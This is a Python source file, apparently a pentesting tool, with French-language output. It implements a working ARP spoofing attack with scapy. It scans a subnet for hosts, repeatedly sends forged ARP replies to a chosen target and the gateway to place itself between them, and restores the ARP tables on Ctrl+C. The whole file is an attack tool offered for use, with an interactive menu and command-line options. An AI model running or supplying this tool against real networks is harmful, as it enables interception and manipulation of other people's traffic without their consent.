#!/usr/bin/env python3
# coding: UTF8
"""
Utilisation :
# Mode interactif
sudo python3 arp_spoof.py

# Direct avec arguments
sudo python3 arp_spoof.py -t 192.168.1.100 -g 192.168.1.1

# Scanner le réseau
sudo python3 arp_spoof.py -s 192.168.1.0/24

Menu interactif :
1. Lancer l'ARP Spoofing
2. Scanner le réseau
3. Restaurer les tables ARP
4. Quitter
Le script nécessite scapy (sudo apt install python3-scapy) et les droits root.
"""

import scapy.all as scapy
import time
import argparse
import sys
import os
from datetime import datetime

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

def print_banner():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}
   ╔══════════════════════════════════════════════╗
   ║           ARP SPOOFING TOOL                  ║
   ║           by CyberTools4Pentesters           ║
   ╚══════════════════════════════════════════════╝
{Colors.END}
"""
    print(banner)

def print_menu():
    menu = f"""
{Colors.YELLOW}{Colors.BOLD}  ┌─────────────────────────────────────────┐
  │              MENU PRINCIPAL              │
  ├─────────────────────────────────────────┤
  │  {Colors.GREEN}1{Colors.YELLOW} - Lancer l'ARP Spoofing            │
  │  {Colors.GREEN}2{Colors.YELLOW} - Scanner le réseau               │
  │  {Colors.GREEN}3{Colors.YELLOW} - Restaurer les tables ARP        │
  │  {Colors.GREEN}4{Colors.YELLOW} - Quitter                        │
  └─────────────────────────────────────────┘{Colors.END}
"""
    print(menu)

def print_status(message, status="info"):
    timestamp = datetime.now().strftime("%H:%M:%S")
    if status == "success":
        print(f"{Colors.GREEN}[{timestamp}] [✓] {message}{Colors.END}")
    elif status == "error":
        print(f"{Colors.RED}[{timestamp}] [✗] {message}{Colors.END}")
    elif status == "warning":
        print(f"{Colors.YELLOW}[{timestamp}] [!] {message}{Colors.END}")
    else:
        print(f"{Colors.CYAN}[{timestamp}] [i] {message}{Colors.END}")

def check_root():
    if os.geteuid() != 0:
        print_status("Ce script nécessite les droits root. Utilisez sudo.", "error")
        sys.exit(1)

def get_mac(ip):
    try:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
        return answered_list[0][1].hwsrc
    except IndexError:
        return None
    except Exception as e:
        print_status(f"Erreur lors de la récupération de l'MAC pour {ip}: {str(e)}", "error")
        return None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if not target_mac:
        print_status(f"Impossible de récupérer l'MAC de {target_ip}", "error")
        return False
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)
    return True

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    if destination_mac and source_mac:
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False)
        return True
    return False

def scan_network(ip_range):
    print_status(f"Scan du réseau {ip_range} en cours...", "info")
    arp_request = scapy.ARP(pdst=ip_range)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=3, verbose=False)[0]
    
    devices = []
    for sent, received in answered_list:
        devices.append({'ip': received.psrc, 'mac': received.hwsrc})
    
    return devices

def display_devices(devices):
    if not devices:
        print_status("Aucun appareil trouvé.", "warning")
        return
    
    print(f"\n{Colors.BOLD}{Colors.CYAN}  Appareils détectés sur le réseau:{Colors.END}")
    print(f"  {'IP':<20} {'MAC':<20}")
    print(f"  {'-'*20} {'-'*20}")
    for device in devices:
        print(f"  {Colors.GREEN}{device['ip']:<20} {device['mac']:<20}{Colors.END}")
    print()

def run_spoofing(target_ip, gateway_ip):
    print_status(f"Démarrage de l'ARP Spoofing...", "success")
    print_status(f"Cible: {target_ip}", "info")
    print_status(f"Passerelle: {gateway_ip}", "info")
    print_status("Appuyez sur Ctrl+C pour arrêter", "warning")
    
    sent_packets_count = 0
    try:
        while True:
            if spoof(target_ip, gateway_ip):
                sent_packets_count += 1
            if spoof(gateway_ip, target_ip):
                sent_packets_count += 1
            
            sys.stdout.write(f"\r{Colors.GREEN}[+] Paquets envoyés: {sent_packets_count}{Colors.END}")
            sys.stdout.flush()
            time.sleep(2)
    except KeyboardInterrupt:
        print(f"\n")
        print_status("Interruption détectée! Restauration des tables ARP...", "warning")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print_status("Tables ARP restaurées avec succès!", "success")

def interactive_mode():
    print_banner()
    
    while True:
        print_menu()
        choice = input(f"{Colors.CYAN}  Sélectionnez une option (1-4): {Colors.END}")
        
        if choice == "1":
            print(f"\n{Colors.BOLD}{Colors.YELLOW}  ── ARP Spoofing ──{Colors.END}")
            target_ip = input(f"  IP de la cible: ").strip()
            gateway_ip = input(f"  IP de la passerelle: ").strip()
            
            if not target_ip or not gateway_ip:
                print_status("Veuillez entrer des IP valides.", "error")
                continue
            
            print(f"\n{Colors.YELLOW}  Configuration:{Colors.END}")
            print(f"  Cible: {Colors.GREEN}{target_ip}{Colors.END}")
            print(f"  Passerelle: {Colors.GREEN}{gateway_ip}{Colors.END}")
            
            confirm = input(f"\n{Colors.YELLOW}  Confirmer? (o/n): {Colors.END}").lower()
            if confirm == 'o':
                run_spoofing(target_ip, gateway_ip)
            else:
                print_status("Opération annulée.", "info")
        
        elif choice == "2":
            print(f"\n{Colors.BOLD}{Colors.YELLOW}  ── Scan Réseau ──{Colors.END}")
            ip_range = input(f"  Plage d'IP (ex: 192.168.1.0/24): ").strip()
            
            if not ip_range:
                print_status("Veuillez entrer une plage d'IP valide.", "error")
                continue
            
            devices = scan_network(ip_range)
            display_devices(devices)
        
        elif choice == "3":
            print(f"\n{Colors.BOLD}{Colors.YELLOW}  ── Restauration ARP ──{Colors.END}")
            target_ip = input(f"  IP de la cible: ").strip()
            gateway_ip = input(f"  IP de la passerelle: ").strip()
            
            if not target_ip or not gateway_ip:
                print_status("Veuillez entrer des IP valides.", "error")
                continue
            
            print_status("Restauration des tables ARP...", "info")
            restore(target_ip, gateway_ip)
            restore(gateway_ip, target_ip)
            print_status("Tables ARP restaurées!", "success")
        
        elif choice == "4":
            print(f"\n{Colors.GREEN}  Au revoir!{Colors.END}\n")
            break
        
        else:
            print_status("Option invalide. Veuillez choisir entre 1 et 4.", "error")

def main():
    parser = argparse.ArgumentParser(
        description="ARP Spoofing Tool - CyberTools4Pentesters",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemples:
  %(prog)s -t 192.168.1.100 -g 192.168.1.1
  %(prog)s -s 192.168.1.0/24
  %(prog)s                    # Mode interactif
        """
    )
    
    parser.add_argument("-t", "--target", help="IP de la cible")
    parser.add_argument("-g", "--gateway", help="IP de la passerelle")
    parser.add_argument("-s", "--scan", help="Scanner le réseau (plage d'IP)")
    parser.add_argument("-r", "--restore", action="store_true", help="Restaurer les tables ARP")
    
    args = parser.parse_args()
    
    check_root()
    
    if args.scan:
        devices = scan_network(args.scan)
        display_devices(devices)
    elif args.target and args.gateway:
        run_spoofing(args.target, args.gateway)
    elif args.restore:
        target = input("IP de la cible: ").strip()
        gateway = input("IP de la passerelle: ").strip()
        restore(target, gateway)
    else:
        interactive_mode()

if __name__ == "__main__":
    main()
